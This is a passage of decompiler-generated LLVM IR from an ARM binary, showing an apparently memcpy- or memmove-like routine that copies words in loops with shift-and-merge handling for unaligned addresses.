  %v9_18ab8 = add i32 %v0_18ab8, 12
  %v10_18ab8 = inttoptr i32 %v9_18ab8 to i32*
  %v11_18ab8 = load i32, i32* @ip, align 4
  store i32 %v11_18ab8, i32* %v10_18ab8, align 4
  %v12_18ab8 = add i32 %v0_18ab8, 16
  store i32 %v12_18ab8, i32* %r0.global-to-local, align 4
  %v0_18abc = load i32, i32* %r2.global-to-local, align 4
  %v2_18abc = add i32 %v0_18abc, -16
  store i32 %v2_18abc, i32* %r2.global-to-local, align 4
  %v6_18ac0 = icmp slt i32 %v0_18abc, 16
  br i1 %v6_18ac0, label %dec_label_pc_18ac4, label %dec_label_pc_18a94.dec_label_pc_18a94_crit_edge

dec_label_pc_18a94.dec_label_pc_18a94_crit_edge:  ; preds = %dec_label_pc_18a94
  %v0_18a94.pre = load i32, i32* @lr, align 4
  %v0_18a98.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18a94

dec_label_pc_18ac4:                               ; preds = %dec_label_pc_18a94
  %v2_18ac4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18ac4, i32* @r4, align 4
  %v5_18ac4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18ac4, i32* @r5, align 4
  %v2_18ac8 = add i32 %v0_18abc, -4
  store i32 %v2_18ac8, i32* %r2.global-to-local, align 4
  %v4_18ac8 = add i32 %v0_18abc, 2147483632
  %v5_18ac8 = and i32 %v2_18ac8, %v4_18ac8
  %v6_18ac8 = icmp slt i32 %v5_18ac8, 0
  store i1 %v6_18ac8, i1* %cpsr_v.global-to-local, align 1
  %v7_18ac8 = icmp slt i32 %v2_18ac8, 0
  store i1 %v7_18ac8, i1* %cpsr_n.global-to-local, align 1
  %v5_18acc = icmp slt i32 %v2_18abc, -12
  br i1 %v5_18acc, label %dec_label_pc_18ae8, label %dec_label_pc_18ad0

dec_label_pc_18ad0:                               ; preds = %dec_label_pc_18ac4, %dec_label_pc_18a84, %dec_label_pc_18ad0
  %v1_18adc = phi i32 [ %v4_18adc, %dec_label_pc_18ad0 ], [ %v12_18ab8, %dec_label_pc_18ac4 ], [ %v0_18a4c75, %dec_label_pc_18a84 ]
  %v0_18ad0 = load i32, i32* @lr, align 4
  %v3_18ad0 = udiv i32 %v0_18ad0, 65536
  store i32 %v3_18ad0, i32* %ip.global-to-local, align 4
  %v0_18ad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ad4 = inttoptr i32 %v0_18ad4 to i32*
  %v2_18ad4 = load i32, i32* %v1_18ad4, align 4
  store i32 %v2_18ad4, i32* @lr, align 4
  %v4_18ad4 = add i32 %v0_18ad4, 4
  store i32 %v4_18ad4, i32* %r1.global-to-local, align 4
  %v4_18ad8 = mul i32 %v2_18ad4, 65536
  %v5_18ad8 = or i32 %v4_18ad8, %v3_18ad0
  store i32 %v5_18ad8, i32* @ip, align 4
  %v2_18adc = inttoptr i32 %v1_18adc to i32*
  store i32 %v5_18ad8, i32* %v2_18adc, align 4
  %v3_18adc = load i32, i32* %r0.global-to-local, align 4
  %v4_18adc = add i32 %v3_18adc, 4
  store i32 %v4_18adc, i32* %r0.global-to-local, align 4
  %v0_18ae0 = load i32, i32* %r2.global-to-local, align 4
  %v2_18ae0 = add i32 %v0_18ae0, -4
  store i32 %v2_18ae0, i32* %r2.global-to-local, align 4
  %v6_18ae4 = icmp slt i32 %v0_18ae0, 4
  br i1 %v6_18ae4, label %dec_label_pc_18ae8.loopexit, label %dec_label_pc_18ad0

dec_label_pc_18ae8.loopexit:                      ; preds = %dec_label_pc_18ad0
  %v4_18ae0 = sub i32 3, %v0_18ae0
  %v5_18ae0 = and i32 %v4_18ae0, %v0_18ae0
  %v6_18ae0 = icmp slt i32 %v5_18ae0, 0
  %v7_18ae0 = icmp slt i32 %v2_18ae0, 0
  store i1 %v6_18ae0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18ae0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18ae8

dec_label_pc_18ae8:                               ; preds = %dec_label_pc_18ae8.loopexit, %dec_label_pc_18ac4
  %v2_189bc112 = phi i32 [ %v4_18adc, %dec_label_pc_18ae8.loopexit ], [ %v12_18ab8, %dec_label_pc_18ac4 ]
  %v0_189ac108 = phi i32 [ %v2_18ae0, %dec_label_pc_18ae8.loopexit ], [ %v2_18ac8, %dec_label_pc_18ac4 ]
  %v0_18ae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_18ae8 = add i32 %v0_18ae8, -2
  store i32 %v1_18ae8, i32* @r1, align 4
  br label %bb133

dec_label_pc_18af0:                               ; preds = %dec_label_pc_18a04
  br i1 %v5_18af4, label %dec_label_pc_18b3c, label %dec_label_pc_18af8

dec_label_pc_18af8:                               ; preds = %dec_label_pc_18af0
  store i32 %v2_18af0, i32* %r2.global-to-local, align 4
  %v3_18afc = load i32, i32* @r4, align 4
  store i32 %v3_18afc, i32* %stack_var_-16, align 4
  %v6_18afc = load i32, i32* @r5, align 4
  store i32 %v6_18afc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18b00

dec_label_pc_18b00:                               ; preds = %dec_label_pc_18b00.dec_label_pc_18b00_crit_edge, %dec_label_pc_18af8
  %v0_18b24 = phi i32 [ %v12_18b24, %dec_label_pc_18b00.dec_label_pc_18b00_crit_edge ], [ %v0_18a4c75, %dec_label_pc_18af8 ]
  %v0_18b04 = phi i32 [ %v0_18b04.pre, %dec_label_pc_18b00.dec_label_pc_18b00_crit_edge ], [ %v4_18a08, %dec_label_pc_18af8 ]
  %v0_18b00 = phi i32 [ %v0_18b00.pre, %dec_label_pc_18b00.dec_label_pc_18b00_crit_edge ], [ %v2_18a08, %dec_label_pc_18af8 ]
  %v3_18b00 = udiv i32 %v0_18b00, 16777216
  store i32 %v3_18b00, i32* %r3.global-to-local, align 4
  %v1_18b04 = inttoptr i32 %v0_18b04 to i32*
  %v2_18b04 = load i32, i32* %v1_18b04, align 4
  store i32 %v2_18b04, i32* %r4.global-to-local, align 4
  %v3_18b04 = add i32 %v0_18b04, 4
  %v4_18b04 = inttoptr i32 %v3_18b04 to i32*
  %v5_18b04 = load i32, i32* %v4_18b04, align 4
  store i32 %v5_18b04, i32* %r5.global-to-local, align 4
  %v6_18b04 = add i32 %v0_18b04, 8
  %v7_18b04 = inttoptr i32 %v6_18b04 to i32*
  %v8_18b04 = load i32, i32* %v7_18b04, align 4
  store i32 %v8_18b04, i32* %ip.global-to-local, align 4
  %v9_18b04 = add i32 %v0_18b04, 12
  %v10_18b04 = inttoptr i32 %v9_18b04 to i32*
  %v11_18b04 = load i32, i32* %v10_18b04, align 4
  store i32 %v11_18b04, i32* @lr, align 4
  %v12_18b04 = add i32 %v0_18b04, 16
  store i32 %v12_18b04, i32* %r1.global-to-local, align 4
  %v4_18b08 = mul i32 %v2_18b04, 256
  %v5_18b08 = or i32 %v4_18b08, %v3_18b00
  store i32 %v5_18b08, i32* %r3.global-to-local, align 4
  %v3_18b0c = udiv i32 %v2_18b04, 16777216
  %v4_18b10 = mul i32 %v5_18b04, 256
  %v5_18b10 = or i32 %v4_18b10, %v3_18b0c
  store i32 %v5_18b10, i32* %r4.global-to-local, align 4
  %v3_18b14 = udiv i32 %v5_18b04, 16777216
  %v4_18b18 = mul i32 %v8_18b04, 256
  %v5_18b18 = or i32 %v4_18b18, %v3_18b14
  store i32 %v5_18b18, i32* %r5.global-to-local, align 4
  %v3_18b1c = udiv i32 %v8_18b04, 16777216
  %v4_18b20 = mul i32 %v11_18b04, 256
  %v5_18b20 = or i32 %v4_18b20, %v3_18b1c
  store i32 %v5_18b20, i32* @ip, align 4
  %v1_18b24 = inttoptr i32 %v0_18b24 to i32*
  store i32 %v5_18b08, i32* %v1_18b24, align 4
  %v3_18b24 = add i32 %v0_18b24, 4
  %v4_18b24 = inttoptr i32 %v3_18b24 to i32*
  %v5_18b24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18b24, i32* %v4_18b24, align 4
  %v6_18b24 = add i32 %v0_18b24, 8
  %v7_18b24 = inttoptr i32 %v6_18b24 to i32*
  %v8_18b24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18b24, i32* %v7_18b24, align 4
  %v9_18b24 = add i32 %v0_18b24, 12
  %v10_18b24 = inttoptr i32 %v9_18b24 to i32*
  %v11_18b24 = load i32, i32* @ip, align 4
  store i32 %v11_18b24, i32* %v10_18b24, align 4
  %v12_18b24 = add i32 %v0_18b24, 16
  store i32 %v12_18b24, i32* %r0.global-to-local, align 4
  %v0_18b28 = load i32, i32* %r2.global-to-local, align 4
  %v2_18b28 = add i32 %v0_18b28, -16
  store i32 %v2_18b28, i32* %r2.global-to-local, align 4
  %v6_18b2c = icmp slt i32 %v0_18b28, 16
  br i1 %v6_18b2c, label %dec_label_pc_18b30, label %dec_label_pc_18b00.dec_label_pc_18b00_crit_edge

dec_label_pc_18b00.dec_label_pc_18b00_crit_edge:  ; preds = %dec_label_pc_18b00
  %v0_18b00.pre = load i32, i32* @lr, align 4
  %v0_18b04.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18b00

dec_label_pc_18b30:                               ; preds = %dec_label_pc_18b00
  %v2_18b30 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18b30, i32* @r4, align 4
  %v5_18b30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18b30, i32* @r5, align 4
  %v2_18b34 = add i32 %v0_18b28, -4
  store i32 %v2_18b34, i32* %r2.global-to-local, align 4
  %v4_18b34 = add i32 %v0_18b28, 2147483632
  %v5_18b34 = and i32 %v2_18b34, %v4_18b34
  %v6_18b34 = icmp slt i32 %v5_18b34, 0
  store i1 %v6_18b34, i1* %cpsr_v.global-to-local, align 1
  %v7_18b34 = icmp slt i32 %v2_18b34, 0
  store i1 %v7_18b34, i1* %cpsr_n.global-to-local, align 1
  %v5_18b38 = icmp slt i32 %v2_18b28, -12
  br i1 %v5_18b38, label %dec_label_pc_18b54, label %dec_label_pc_18b3c

dec_label_pc_18b3c:                               ; preds = %dec_label_pc_18b30, %dec_label_pc_18af0, %dec_label_pc_18b3c
  %v1_18b48 = phi i32 [ %v4_18b48, %dec_label_pc_18b3c ], [ %v12_18b24, %dec_label_pc_18b30 ], [ %v0_18a4c75, %dec_label_pc_18af0 ]
  %v0_18b3c = load i32, i32* @lr, align 4
  %v3_18b3c = udiv i32 %v0_18b3c, 16777216
  store i32 %v3_18b3c, i32* %ip.global-to-local, align 4
  %v0_18b40 = load i32, i32* %r1.global-to-local, align 4
  %v1_18b40 = inttoptr i32 %v0_18b40 to i32*
  %v2_18b40 = load i32, i32* %v1_18b40, align 4
  store i32 %v2_18b40, i32* @lr, align 4
  %v4_18b40 = add i32 %v0_18b40, 4
  store i32 %v4_18b40, i32* %r1.global-to-local, align 4
  %v4_18b44 = mul i32 %v2_18b40, 256
  %v5_18b44 = or i32 %v4_18b44, %v3_18b3c
  store i32 %v5_18b44, i32* @ip, align 4
  %v2_18b48 = inttoptr i32 %v1_18b48 to i32*
  store i32 %v5_18b44, i32* %v2_18b48, align 4
  %v3_18b48 = load i32, i32* %r0.global-to-local, align 4
  %v4_18b48 = add i32 %v3_18b48, 4
  store i32 %v4_18b48, i32* %r0.global-to-local, align 4
  %v0_18b4c = load i32, i32* %r2.global-to-local, align 4
  %v2_18b4c = add i32 %v0_18b4c, -4
  store i32 %v2_18b4c, i32* %r2.global-to-local, align 4
  %v6_18b50 = icmp slt i32 %v0_18b4c, 4
  br i1 %v6_18b50, label %dec_label_pc_18b54.loopexit, label %dec_label_pc_18b3c

dec_label_pc_18b54.loopexit:                      ; preds = %dec_label_pc_18b3c
  %v4_18b4c = sub i32 3, %v0_18b4c
  %v5_18b4c = and i32 %v4_18b4c, %v0_18b4c
  %v6_18b4c = icmp slt i32 %v5_18b4c, 0
  %v7_18b4c = icmp slt i32 %v2_18b4c, 0
  store i1 %v6_18b4c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18b4c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18b54

dec_label_pc_18b54:                               ; preds = %dec_label_pc_18b54.loopexit, %dec_label_pc_18b30
  %v2_189bc114 = phi i32 [ %v4_18b48, %dec_label_pc_18b54.loopexit ], [ %v12_18b24, %dec_label_pc_18b30 ]
  %v0_189ac110 = phi i32 [ %v2_18b4c, %dec_label_pc_18b54.loopexit ], [ %v2_18b34, %dec_label_pc_18b30 ]
  %v0_18b54 = load i32, i32* %r1.global-to-local, align 4
  %v1_18b54 = add i32 %v0_18b54, -1
  store i32 %v1_18b54, i32* @r1, align 4
  br label %bb133

dec_label_pc_18b5c:                               ; preds = %entry
  %v1_18b5c = load i32, i32* @r2, align 4
  %v2_18b5c = add i32 %v1_18b5c, %v0_18910
  store i32 %v2_18b5c, i32* @r1, align 4
  %v2_18b60 = add i32 %v1_18b5c, %v1_18910
  store i32 %v2_18b60, i32* %r0.global-to-local, align 4
  %v2_18b64 = add i32 %v1_18b5c, -4
  store i32 %v2_18b64, i32* %r2.global-to-local, align 4
  %v4_18b64 = sub i32 3, %v1_18b5c
  %v5_18b64 = and i32 %v4_18b64, %v1_18b5c
  %v6_18b64 = icmp slt i32 %v5_18b64, 0
  store i1 %v6_18b64, i1* %cpsr_v.global-to-local, align 1
  %v7_18b64 = icmp slt i32 %v2_18b64, 0
  store i1 %v7_18b64, i1* %cpsr_n.global-to-local, align 1
  %v5_18b68 = icmp slt i32 %v1_18b5c, 4
  br i1 %v5_18b68, label %bb143, label %dec_label_pc_18b6c

dec_label_pc_18b6c:                               ; preds = %dec_label_pc_18b5c
  %v1_18b6c = urem i32 %v2_18b60, 4
  store i32 %v1_18b6c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18b6c = icmp eq i32 %v1_18b6c, 0
  br i1 %v2_18b6c, label %dec_label_pc_18b74, label %dec_label_pc_18c14

dec_label_pc_18b74:                               ; preds = %dec_label_pc_18b6c
  %v1_18b74 = urem i32 %v2_18b5c, 4
  store i32 %v1_18b74, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18b74 = icmp eq i32 %v1_18b74, 0
  br i1 %v2_18b74, label %dec_label_pc_18b7c, label %dec_label_pc_18c40

dec_label_pc_18b7c:                               ; preds = %dec_label_pc_18b74, %dec_label_pc_18c38
  %v0_18b9449 = phi i32 [ %v2_18b60, %dec_label_pc_18b74 ], [ %v0_18c8832, %dec_label_pc_18c38 ]
  %v0_18b9048 = phi i32 [ %v2_18b5c, %dec_label_pc_18b74 ], [ %v0_18c38, %dec_label_pc_18c38 ]
  %v0_18b7c = phi i32 [ %v2_18b64, %dec_label_pc_18b74 ], [ %v2_18c30, %dec_label_pc_18c38 ]
  %v2_18b7c = add i32 %v0_18b7c, -8
  store i32 %v2_18b7c, i32* %r2.global-to-local, align 4
  %v4_18b7c = sub i32 7, %v0_18b7c
  %v5_18b7c = and i32 %v4_18b7c, %v0_18b7c
  %v6_18b7c = icmp slt i32 %v5_18b7c, 0
  store i1 %v6_18b7c, i1* %cpsr_v.global-to-local, align 1
  %v7_18b7c = icmp slt i32 %v2_18b7c, 0
  store i1 %v7_18b7c, i1* %cpsr_n.global-to-local, align 1
  %v5_18b80 = icmp slt i32 %v0_18b7c, 8
  br i1 %v5_18b80, label %dec_label_pc_18bcc, label %dec_label_pc_18b84

dec_label_pc_18b84:                               ; preds = %dec_label_pc_18b7c
  %v3_18b84 = load i32, i32* @r4, align 4
  %v5_18b84 = inttoptr i32 %v3_18b84 to i8*
  store i8* %v5_18b84, i8** %stack_var_-8, align 4
  %v8_18b84 = load i32, i32* @lr, align 4
  %v2_18b88 = add i32 %v0_18b7c, -28
  store i32 %v2_18b88, i32* %r2.global-to-local, align 4
  %v4_18b88 = sub i32 27, %v0_18b7c
  %v5_18b88 = and i32 %v4_18b88, %v2_18b7c
  %v6_18b88 = icmp slt i32 %v5_18b88, 0
  store i1 %v6_18b88, i1* %cpsr_v.global-to-local, align 1
  %v7_18b88 = icmp slt i32 %v2_18b88, 0
  store i1 %v7_18b88, i1* %cpsr_n.global-to-local, align 1
  %v5_18b8c = icmp slt i32 %v2_18b7c, 20
  br i1 %v5_18b8c, label %dec_label_pc_18ba8, label %dec_label_pc_18b90

dec_label_pc_18b90:                               ; preds = %dec_label_pc_18b84, %dec_label_pc_18b90.dec_label_pc_18b90_crit_edge
  %v0_18b94 = phi i32 [ %v1_18b9c, %dec_label_pc_18b90.dec_label_pc_18b90_crit_edge ], [ %v0_18b9449, %dec_label_pc_18b84 ]
  %v0_18b90 = phi i32 [ %v0_18b90.pre, %dec_label_pc_18b90.dec_label_pc_18b90_crit_edge ], [ %v0_18b9048, %dec_label_pc_18b84 ]
  %v1_18b90 = add i32 %v0_18b90, -4
  %v2_18b90 = inttoptr i32 %v1_18b90 to i32*
  %v3_18b90 = load i32, i32* %v2_18b90, align 4
  store i32 %v3_18b90, i32* %r3.global-to-local, align 4
  %v4_18b90 = add i32 %v0_18b90, -8
  %v5_18b90 = inttoptr i32 %v4_18b90 to i32*
  %v6_18b90 = load i32, i32* %v5_18b90, align 4
  store i32 %v6_18b90, i32* %r4.global-to-local, align 4
  %v7_18b90 = add i32 %v0_18b90, -12
  %v8_18b90 = inttoptr i32 %v7_18b90 to i32*
  %v9_18b90 = load i32, i32* %v8_18b90, align 4
  store i32 %v9_18b90, i32* %ip.global-to-local, align 4
  %v10_18b90 = add i32 %v0_18b90, -16
  %v11_18b90 = inttoptr i32 %v10_18b90 to i32*
  %v12_18b90 = load i32, i32* %v11_18b90, align 4
  store i32 %v12_18b90, i32* %lr.global-to-local, align 4
  store i32 %v10_18b90, i32* %r1.global-to-local, align 4
  %v1_18b94 = add i32 %v0_18b94, -16
  %v2_18b94 = inttoptr i32 %v1_18b94 to i32*
  store i32 %v3_18b90, i32* %v2_18b94, align 4
  %v4_18b94 = add i32 %v0_18b94, -12
  %v5_18b94 = inttoptr i32 %v4_18b94 to i32*
  %v6_18b94 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18b94, i32* %v5_18b94, align 4
  %v7_18b94 = add i32 %v0_18b94, -8
  %v8_18b94 = inttoptr i32 %v7_18b94 to i32*
  %v9_18b94 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_18b94, i32* %v8_18b94, align 4
  %v10_18b94 = add i32 %v0_18b94, -4
  %v11_18b94 = inttoptr i32 %v10_18b94 to i32*
  %v12_18b94 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18b94, i32* %v11_18b94, align 4
  store i32 %v1_18b94, i32* %r0.global-to-local, align 4
  %v0_18b98 = load i32, i32* %r1.global-to-local, align 4
  %v1_18b98 = add i32 %v0_18b98, -4
  %v2_18b98 = inttoptr i32 %v1_18b98 to i32*
  %v3_18b98 = load i32, i32* %v2_18b98, align 4
  store i32 %v3_18b98, i32* %r3.global-to-local, align 4
  %v4_18b98 = add i32 %v0_18b98, -8
  %v5_18b98 = inttoptr i32 %v4_18b98 to i32*
  %v6_18b98 = load i32, i32* %v5_18b98, align 4
  store i32 %v6_18b98, i32* %r4.global-to-local, align 4
  %v7_18b98 = add i32 %v0_18b98, -12
  %v8_18b98 = inttoptr i32 %v7_18b98 to i32*
  %v9_18b98 = load i32, i32* %v8_18b98, align 4
  store i32 %v9_18b98, i32* @ip, align 4
  %v10_18b98 = add i32 %v0_18b98, -16
  %v11_18b98 = inttoptr i32 %v10_18b98 to i32*
  %v12_18b98 = load i32, i32* %v11_18b98, align 4
  store i32 %v12_18b98, i32* %lr.global-to-local, align 4
  store i32 %v10_18b98, i32* @r1, align 4
  %v1_18b9c = add i32 %v0_18b94, -32
  %v2_18b9c = inttoptr i32 %v1_18b9c to i32*
  store i32 %v3_18b98, i32* %v2_18b9c, align 4
  %v4_18b9c = add i32 %v0_18b94, -28
  %v5_18b9c = inttoptr i32 %v4_18b9c to i32*
  %v6_18b9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18b9c, i32* %v5_18b9c, align 4
  %v7_18b9c = add i32 %v0_18b94, -24
  %v8_18b9c = inttoptr i32 %v7_18b9c to i32*
  %v9_18b9c = load i32, i32* @ip, align 4
  store i32 %v9_18b9c, i32* %v8_18b9c, align 4
  %v10_18b9c = add i32 %v0_18b94, -20
  %v11_18b9c = inttoptr i32 %v10_18b9c to i32*
  %v12_18b9c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18b9c, i32* %v11_18b9c, align 4
  store i32 %v1_18b9c, i32* %r0.global-to-local, align 4
  %v0_18ba0 = load i32, i32* %r2.global-to-local, align 4
  %v2_18ba0 = add i32 %v0_18ba0, -32
  store i32 %v2_18ba0, i32* %r2.global-to-local, align 4
  %v6_18ba4 = icmp slt i32 %v0_18ba0, 32
  br i1 %v6_18ba4, label %dec_label_pc_18ba8.loopexit, label %dec_label_pc_18b90.dec_label_pc_18b90_crit_edge

dec_label_pc_18b90.dec_label_pc_18b90_crit_edge:  ; preds = %dec_label_pc_18b90
  %v0_18b90.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18b90

dec_label_pc_18ba8.loopexit:                      ; preds = %dec_label_pc_18b90
  %v4_18ba0 = sub i32 31, %v0_18ba0
  %v5_18ba0 = and i32 %v4_18ba0, %v0_18ba0
  %v6_18ba0 = icmp slt i32 %v5_18ba0, 0
  %v7_18ba0 = icmp slt i32 %v2_18ba0, 0
  store i1 %v6_18ba0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18ba0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18ba8

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18ba8.loopexit, %dec_label_pc_18b84
  %v6_18bb0 = phi i32 [ %v1_18b9c, %dec_label_pc_18ba8.loopexit ], [ %v0_18b9449, %dec_label_pc_18b84 ]
  %v0_18bb8.pr = phi i32 [ %v2_18ba0, %dec_label_pc_18ba8.loopexit ], [ %v2_18b88, %dec_label_pc_18b84 ]
  %v4_18ba8 = add i32 %v0_18bb8.pr, 16
  %v6_18ba8 = sub i32 0, %v0_18bb8.pr
  %v7_18ba8 = and i32 %v4_18ba8, %v6_18ba8
  %v8_18ba8 = icmp slt i32 %v7_18ba8, 0
  store i1 %v8_18ba8, i1* %cpsr_v.global-to-local, align 1
  %v9_18ba8 = icmp slt i32 %v4_18ba8, 0
  store i1 %v9_18ba8, i1* %cpsr_n.global-to-local, align 1
  %v5_18bac = icmp slt i32 %v0_18bb8.pr, -16
  br i1 %v5_18bac, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_18ba8
  %v6_18bac = load i32, i32* @r1, align 4
  %v7_18bac = add i32 %v6_18bac, -4
  %v8_18bac = inttoptr i32 %v7_18bac to i32*
  %v9_18bac = load i32, i32* %v8_18bac, align 4
  store i32 %v9_18bac, i32* %r3.global-to-local, align 4
  %v10_18bac = add i32 %v6_18bac, -8
  %v11_18bac = inttoptr i32 %v10_18bac to i32*
  %v12_18bac = load i32, i32* %v11_18bac, align 4
  store i32 %v12_18bac, i32* %r4.global-to-local, align 4
  %v13_18bac = add i32 %v6_18bac, -12
  %v14_18bac = inttoptr i32 %v13_18bac to i32*
  %v15_18bac = load i32, i32* %v14_18bac, align 4
  store i32 %v15_18bac, i32* @ip, align 4
  %v16_18bac = add i32 %v6_18bac, -16
  %v17_18bac = inttoptr i32 %v16_18bac to i32*
  %v18_18bac = load i32, i32* %v17_18bac, align 4
  store i32 %v18_18bac, i32* %lr.global-to-local, align 4
  store i32 %v16_18bac, i32* @r1, align 4
  %v7_18bb0 = add i32 %v6_18bb0, -16
  %v8_18bb0 = inttoptr i32 %v7_18bb0 to i32*
  store i32 %v9_18bac, i32* %v8_18bb0, align 4
  %v10_18bb0 = add i32 %v6_18bb0, -12
  %v11_18bb0 = inttoptr i32 %v10_18bb0 to i32*
  %v12_18bb0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18bb0, i32* %v11_18bb0, align 4
  %v13_18bb0 = add i32 %v6_18bb0, -8
  %v14_18bb0 = inttoptr i32 %v13_18bb0 to i32*
  %v15_18bb0 = load i32, i32* @ip, align 4
  store i32 %v15_18bb0, i32* %v14_18bb0, align 4
  %v16_18bb0 = add i32 %v6_18bb0, -4
  %v17_18bb0 = inttoptr i32 %v16_18bb0 to i32*
  %v18_18bb0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18bb0, i32* %v17_18bb0, align 4
  store i32 %v7_18bb0, i32* %r0.global-to-local, align 4
  %v6_18bb4 = load i32, i32* %r2.global-to-local, align 4
  %v7_18bb4 = add i32 %v6_18bb4, -16
  store i32 %v7_18bb4, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_18ba8, %bb140
  %v6_18bc0 = phi i32 [ %v7_18bb0, %bb140 ], [ %v6_18bb0, %dec_label_pc_18ba8 ]
  %v0_18bb8 = phi i32 [ %v7_18bb4, %bb140 ], [ %v0_18bb8.pr, %dec_label_pc_18ba8 ]
  %v4_18bb8 = add i32 %v0_18bb8, 20
  store i32 %v4_18bb8, i32* %r2.global-to-local, align 4
  %v6_18bb8 = sub i32 0, %v0_18bb8
  %v7_18bb8 = and i32 %v4_18bb8, %v6_18bb8
  %v8_18bb8 = icmp slt i32 %v7_18bb8, 0
  store i1 %v8_18bb8, i1* %cpsr_v.global-to-local, align 1
  %v9_18bb8 = icmp slt i32 %v4_18bb8, 0
  store i1 %v9_18bb8, i1* %cpsr_n.global-to-local, align 1
  %v5_18bbc = icmp slt i32 %v0_18bb8, -20
  br i1 %v5_18bbc, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_18bbc = load i32, i32* @r1, align 4
  %v7_18bbc = add i32 %v6_18bbc, -4
  %v8_18bbc = inttoptr i32 %v7_18bbc to i32*
  %v9_18bbc = load i32, i32* %v8_18bbc, align 4
  store i32 %v9_18bbc, i32* %r3.global-to-local, align 4
  %v10_18bbc = add i32 %v6_18bbc, -8
  %v11_18bbc = inttoptr i32 %v10_18bbc to i32*
  %v12_18bbc = load i32, i32* %v11_18bbc, align 4
  store i32 %v12_18bbc, i32* @ip, align 4
  %v13_18bbc = add i32 %v6_18bbc, -12
  %v14_18bbc = inttoptr i32 %v13_18bbc to i32*
  %v15_18bbc = load i32, i32* %v14_18bbc, align 4
  store i32 %v15_18bbc, i32* %lr.global-to-local, align 4
  store i32 %v13_18bbc, i32* @r1, align 4
  %v7_18bc0 = add i32 %v6_18bc0, -12
  %v8_18bc0 = inttoptr i32 %v7_18bc0 to i32*
  store i32 %v9_18bbc, i32* %v8_18bc0, align 4
  %v10_18bc0 = add i32 %v6_18bc0, -8
  %v11_18bc0 = inttoptr i32 %v10_18bc0 to i32*
  %v12_18bc0 = load i32, i32* @ip, align 4
  store i32 %v12_18bc0, i32* %v11_18bc0, align 4
  %v13_18bc0 = add i32 %v6_18bc0, -4
  %v14_18bc0 = inttoptr i32 %v13_18bc0 to i32*
  %v15_18bc0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18bc0, i32* %v14_18bc0, align 4
  store i32 %v7_18bc0, i32* %r0.global-to-local, align 4
  %v6_18bc4 = load i32, i32* %r2.global-to-local, align 4
  %v7_18bc4 = add i32 %v6_18bc4, -12
  store i32 %v7_18bc4, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_18be457 = phi i32 [ %v6_18bc0, %.thread14 ], [ %v7_18bc0, %bb141 ]
  %v0_18bcc55 = phi i32 [ %v4_18bb8, %.thread14 ], [ %v7_18bc4, %bb141 ]
  %v2_18bc8 = load i8*, i8** %stack_var_-8, align 4
  %v3_18bc8 = ptrtoint i8* %v2_18bc8 to i32
  store i32 %v3_18bc8, i32* @r4, align 4
  store i32 %v8_18b84, i32* @lr, align 4
  br label %dec_label_pc_18bcc

dec_label_pc_18bcc:                               ; preds = %dec_label_pc_18b7c, %.thread16
  %v7_18bdc = phi i32 [ %v0_18b9449, %dec_label_pc_18b7c ], [ %v6_18be457, %.thread16 ]
  %v0_18bcc = phi i32 [ %v2_18b7c, %dec_label_pc_18b7c ], [ %v0_18bcc55, %.thread16 ]
  %v2_18bcc = add i32 %v0_18bcc, 8
  store i32 %v2_18bcc, i32* %r2.global-to-local, align 4
  %v4_18bcc = sub i32 0, %v0_18bcc
  %v5_18bcc = and i32 %v2_18bcc, %v4_18bcc
  %v6_18bcc = icmp slt i32 %v5_18bcc, 0
  store i1 %v6_18bcc, i1* %cpsr_v.global-to-local, align 1
  %v7_18bcc = icmp slt i32 %v2_18bcc, 0
  store i1 %v7_18bcc, i1* %cpsr_n.global-to-local, align 1
  %v5_18bd0 = icmp slt i32 %v0_18bcc, -8
  br i1 %v5_18bd0, label %bb143, label %dec_label_pc_18bd4

dec_label_pc_18bd4:                               ; preds = %dec_label_pc_18bcc
  %v6_18bd4 = add i32 %v0_18bcc, 4
  store i32 %v6_18bd4, i32* %r2.global-to-local, align 4
  %v8_18bd4 = sub i32 -5, %v0_18bcc
  %v9_18bd4 = and i32 %v8_18bd4, %v2_18bcc
  %v10_18bd4 = icmp slt i32 %v9_18bd4, 0
  store i1 %v10_18bd4, i1* %cpsr_v.global-to-local, align 1
  %v11_18bd4 = icmp slt i32 %v6_18bd4, 0
  store i1 %v11_18bd4, i1* %cpsr_n.global-to-local, align 1
  %v5_18bd8 = icmp slt i32 %v2_18bcc, 4
  %v6_18bd8 = load i32, i32* @r1, align 4
  %v7_18bd8 = add i32 %v6_18bd8, -4
  %v8_18bd8 = inttoptr i32 %v7_18bd8 to i32*
  %v9_18bd8 = load i32, i32* %v8_18bd8, align 4
